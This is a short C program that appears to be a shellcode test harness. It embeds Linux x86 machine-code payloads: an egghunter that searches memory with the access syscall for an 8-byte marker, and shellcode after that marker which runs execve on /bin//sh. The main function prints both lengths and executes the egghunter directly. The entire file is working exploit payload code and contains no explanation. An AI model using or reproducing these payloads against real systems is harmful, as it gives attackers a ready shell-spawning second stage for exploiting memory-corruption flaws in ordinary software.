#include<stdio.h>
#include<string.h>
#define EGG "\x90\x50\x90\x50"

unsigned char shellcode[] = EGG EGG"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned char egghunter[] ="\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

int main()
{

    
    printf("Egghunter Length:  %d\n", strlen(egghunter));
    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())egghunter;

    ret();

}
